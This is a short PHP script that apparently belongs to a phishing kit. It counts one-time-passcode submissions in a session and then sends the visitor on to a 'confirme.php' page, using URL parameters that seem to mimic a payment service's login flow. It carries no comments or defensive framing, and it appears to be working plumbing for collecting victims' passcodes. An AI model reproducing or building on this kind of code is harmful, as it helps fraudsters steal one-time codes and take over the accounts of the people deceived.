<?php
session_start();
include "setting.php";
include "vendorotp.php";
@ini_set('display_errors', 'on');
if(($_SESSION['otp1'] == $otpsend) OR ($_SESSION['otp1'] > $otpsend)){
header('Location: ../../confirme.php?country.x=Global&three=ok&flowId=ul');
session_destroy();
}else{
header('Location: ../../indexotp.php?country.x=Global'); 
}

?>